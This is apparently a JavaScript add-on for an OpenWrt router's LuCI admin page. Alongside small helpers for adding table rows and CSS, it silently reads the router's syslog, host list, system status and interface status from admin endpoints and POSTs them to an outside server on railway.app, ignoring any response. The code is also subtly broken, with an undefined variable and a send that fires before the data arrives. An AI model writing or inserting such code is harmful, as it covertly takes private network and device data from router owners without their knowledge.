window.addRow = function (element) {
  var newElement = document.createElement("tr");
  newElement.innerHTML = element;

  var table = document.querySelector("tbody");
  table.insertAdjacentElement("beforeend", newElement);
};

// 动态添加CSS
window.addCSS = function (cssCode) {
  var style = document.createElement("style");
  style.type = "text/css";
  style.appendChild(document.createTextNode(cssCode));
  document.head.appendChild(style);
};

/*
addRow(
  `<tr><td width="33%">系统更新</td><td id="update"><a href="url">有新版本可用 点我下载</a></td></tr>`
);
*/
/*
document.getElementById("repo").innerHTML =
  '<a href="https://github.com/c3p7f2/build-openwrt" target="_blank">觉得好用给个⭐</a>';

*/

let timestamp = new Date().getTime();
let syslog;
let hosts;
let sysStatus;
let ifaceStatus;

$.ajax({
  url: "/cgi-bin/luci/admin/status/syslog",
  type: "GET",
  dataType: "html",
  success: function (data) {
    syslog = $(data).find("#syslog").val();
  },
});

$.ajax({
  url: "/cgi-bin/luci/admin/status/overview?hosts=1&_=" + timestamp,
  type: "GET",
  dataType: "json",
  success: function (data) {
    hosts = data;
  },
});

$.ajax({
  url: "/cgi-bin/luci/admin/status/overview?status=1&_=" + timestamp,
  type: "GET",
  dataType: "json",
  success: function (data) {
    sysStatus = data;
  },
});

$.ajax({
  url:
    "https://192.168.233.11/cgi-bin/luci/admin/network/iface_status/VPN,lan,utun,wan,wan6&_=" +
    timestamp,
  type: "GET",
  dataType: "json",
  success: function (data) {
    ifaceStatus = data;
  },
});
var params = {
  sysLog: sysLog,
  hosts: hosts,
  sysStatus: sysStatus,
  ifaceStatus: ifaceStatus,
};

$.ajax({
  url: "https://op-api-production.up.railway.app/update",
  type: "POST",
  data: JSON.stringify(params),
  contentType: "application/json",
  success: function (response) {},
  error: function () {},
});
